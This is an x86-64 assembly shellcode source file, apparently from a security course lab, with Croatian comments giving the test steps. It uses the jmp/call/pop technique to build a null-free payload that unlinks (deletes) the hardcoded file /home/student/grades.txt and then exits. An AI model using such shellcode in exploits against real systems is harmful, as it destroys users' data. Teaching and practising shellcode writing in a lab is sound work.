#include <sys/syscall.h>

/* naredbe redom:
1. touch ~/grades.txt
2. ls ~/grades.txt - provjera
3. make
4. ./run-shellcode shellcode.bin
5. ls ~/grades.txt - provjera*/

#define STRING	"/home/student/grades.txt"
#define STRLEN	24

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popq	%rcx
	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */
	movq    %rcx, %rdi
	movb	$SYS_unlink,%al	/* set up the syscall number */
	syscall				/* invoke syscall */
	xorq	%rax,%rax
	movb 	$SYS_exit,%al
	xorq 	%rdi,%rdi
	syscall

 calladdr:
	call	popladdr
	.ascii	STRING
